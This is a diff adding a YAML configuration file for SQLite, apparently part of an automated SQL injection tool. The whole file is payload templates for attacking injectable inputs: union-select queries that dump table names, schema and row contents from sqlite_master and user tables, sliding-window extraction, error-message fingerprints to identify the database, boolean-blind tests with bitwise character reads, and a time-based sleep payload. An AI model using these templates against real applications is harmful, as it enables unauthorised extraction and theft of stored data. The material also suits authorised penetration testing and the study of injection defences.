@@ -1,0 +1,190 @@
+vendor: SQLite
+
+resource:
+ info: |
+  select
+      sqlite_version()
+      || '${enclose_value_sql}'
+      || 'sqlite_master'
+      || '${enclose_value_sql}'
+      || 'anonymous'
+
+ schema:
+  database: |
+   select
+       '${enclose_value_sql}'
+       || r
+       || '${separator_qte_sql}'
+       || q
+       || '${enclose_value_sql}'
+   from (
+       select
+           'sqlite_master' r,
+           count(*) q
+       from sqlite_master
+       where type = 'table'
+   )
+   ${limit}
+
+  table: |
+   select
+       group_concat(
+           '${enclose_value_sql}'
+           || name
+           || '${separator_qte_sql}0${enclose_value_sql}',
+           '${separator_cell_sql}'
+       )
+   from (
+       select *
+       from sqlite_master
+       where type = 'table'
+       order by tbl_name
+       ${limit}
+   )
+
+  column: |
+   select sql from sqlite_master
+   where tbl_name = '${table}'
+   and type = 'table'
+   ${limit}
+
+  row:
+   query: |
+    select
+        ifnull(
+            group_concat(
+                '${enclose_value_sql}'
+                || r
+                || '${separator_qte_sql}0${enclose_value_sql}',
+                '${separator_cell_sql}'
+            ),
+            ''
+        )
+    from (
+        select distinct ${fields} r
+        from ${table}
+        ${limit}
+    )
+   fields:
+    field: |
+     trim(
+         ifnull(
+             ${field.value},
+             ''
+         )
+     )
+    concat: "|| '%7f' ||"
+
+ zip:
+  database: |
+   select
+       '${enclose_value_sql}sqlite_master${separator_qte_sql}'
+       || count(*)
+       || '${enclose_value_sql}'
+   from sqlite_master
+   where type = 'table'
+   ${limit}
+
+  table: |
+   select
+       '${enclose_value_sql}'
+       || name
+       || '${separator_qte_sql}0${enclose_value_sql}'
+   from sqlite_master
+   where type = 'table'
+   ${limit}
+
+  column: |
+   select sql
+   from sqlite_master
+   where tbl_name = '${table}'
+   and type = 'table'
+   ${limit}
+
+  row:
+   query: |
+    select
+        '${enclose_value_sql}'
+        || ${fields}
+        || '${separator_qte_sql}0${enclose_value_sql}'
+    from ${table}
+    ${limit}
+   fields:
+    field: |
+     ${field.value}
+    concat: "|| '%7f' ||"
+
+strategy:
+ configuration:
+  slidingWindow: |
+   (
+       select
+           '${lead}'
+           || substr(
+               ifnull(
+                   (${injection}),
+                   ''
+               ),
+               ${window.char},
+               65536
+           )
+           || '${trail_sql}'
+   )
+  limit: limit 65536 offset ${limit.value}
+  failsafe: 1337${indice}7330%2b1
+  calibrator: |
+   printf('%25.*c', 65536, '${calibrator_sql}')
+  limitBoundary: 0
+  endingComment: --+-
+  fingerprint:
+   errorMessage:
+    # Spring
+    - '[SQLITE_SCHEMA]  The database schema changed (no such column: .*) [DB Errorcode=\\d+]'
+    - '[SQLITE_ERROR] SQL error or missing database (near ".*": syntax error) [DB Errorcode=\\d+]'
+    - '[SQLITE_ERROR] SQL error or missing database (incomplete input) [DB Errorcode=\\d+]'
+    - '[SQLITE_ERROR] SQL error or missing database (unrecognized token: ".*") [DB Errorcode=\\d+]'
+    # Other
+    - SQLite
+   orderByErrorMessage:
+    - ORDER BY term out of range - should be between
+
+ normal:
+  indices: union select ${indices}
+  capacity: (select '${lead}${indice}' || ${calibrator})
+  orderBy: order by 1337
+
+ boolean:
+  test:
+   falses:
+    - 0 = 1
+    - 0 %21= 0
+    - 0.1 %21= 0.1
+    - 1 = 2
+    - 1 %21= 1
+    - 2 %21= 2
+   trues:
+    - 1.2 = 1.2
+    - 0.1 = 0.1
+    - 0 %21= 1
+    - 1 = 1
+    - 2 = 2
+    - 1 %21= 2
+   initialization: 0%2b1 = 1
+   bit: |
+    unicode(
+        substr(
+            ${injection},
+            ${window.char},
+            1
+        )
+    )
+    %26${bit}
+  modeAnd: and
+  modeOr: or
+  blind: ${boolean.mode} ${test}
+  time: |
+   ${boolean.mode} if(
+       ${test},
+       1,
+       sleep(${sleep_time})
+   )
